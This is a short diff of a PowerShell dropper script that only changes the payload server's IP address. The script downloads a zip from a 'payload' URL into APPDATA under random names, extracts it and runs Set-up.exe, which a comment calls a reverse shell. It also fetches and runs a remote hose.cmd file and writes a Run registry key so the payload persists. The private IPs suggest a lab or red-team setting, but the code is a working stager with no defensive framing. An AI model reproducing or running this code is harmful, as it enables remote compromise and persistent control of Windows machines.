@@ -1,4 +1,4 @@
-$zipUrl = "http://192.168.204.152/payload/win15.zip"
+$zipUrl = "http://192.168.204.146/payload/win15.zip"
 $zipDest = "$env:APPDATA\bFylC6zX.zip"
 $extractPath = "$env:APPDATA\7oCDTWYu"
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipDest
@@ -6,6 +6,6 @@ Expand-Archive -Path $zipDest -DestinationPath $extractPath -Force
 $setupPath = "$extractPath\Set-up.exe"
 if (-not (Test-Path $extractPath)) { New-Item -Path $extractPath -ItemType Directory }
 Start-Process -FilePath $setupPath  # Start Set-up.exe immediately for reverse shell
-Start-BitsTransfer -Source "http://192.168.204.152/payload/hose.cmd" -Destination "$extractPath\Hose.cmd"
+Start-BitsTransfer -Source "http://192.168.204.146/payload/hose.cmd" -Destination "$extractPath\Hose.cmd"
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $extractPath\Hose.cmd"
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "5TQjtTuo" -Value $setupPath -PropertyType String -Force
